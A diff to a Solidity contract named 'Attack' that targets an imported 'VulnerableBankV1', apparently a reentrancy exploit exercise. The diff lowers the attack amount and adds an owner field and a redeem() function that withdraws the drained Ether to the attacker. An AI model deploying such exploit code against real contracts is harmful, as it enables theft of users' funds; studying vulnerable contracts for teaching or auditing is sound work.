@@ -5,10 +5,12 @@ import "./VulnerableBankV1.sol";
 
 contract Attack {
     VulnerableBankV1 public vulnerableBank;
-    uint256 public constant AMOUNT = 1 ether;
+    uint256 public constant AMOUNT = 0.00001 ether;
+    address owner;
 
     constructor(address _vulnerableBankAddress) {
         vulnerableBank = VulnerableBankV1(_vulnerableBankAddress);
+        owner=msg.sender;
     }
 
     // Receive function is called when Ether is sent directly to this contract.
@@ -27,5 +29,11 @@ contract Attack {
     // Helper function to check the balance of this contract
     function getBalance() public view returns (uint256) {
         return address(this).balance;
+    }
+
+    function redeem() external {
+        // Send all received Ether to owner
+        require(msg.sender==owner);
+        payable(msg.sender).transfer(address(this).balance);
     }
 }
